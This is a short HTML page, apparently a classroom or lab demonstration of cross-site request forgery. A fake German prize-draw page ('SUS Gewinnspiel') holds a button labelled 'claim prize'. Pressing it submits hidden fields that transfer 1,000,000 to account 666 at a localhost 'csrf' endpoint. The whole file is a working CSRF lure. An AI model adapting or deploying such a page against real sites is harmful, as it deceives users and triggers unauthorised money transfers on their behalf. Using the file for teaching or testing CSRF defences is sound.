<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>

<body>

    <h1>SUS Gewinnspiel</h1>

    <form action="http://localhost/csrf/welcome.php" method="post">
        <p>
            <input id="amount" type="hidden" name="amount" value="1000000"><br>
        </p>
        <p>
            <input id="account" type="hidden" name="account" value="666"><br>
        </p>
        <p>
            <input type="submit" name="send" value="Gewinn aholen">
        </p>
    </form>

</body>

</html>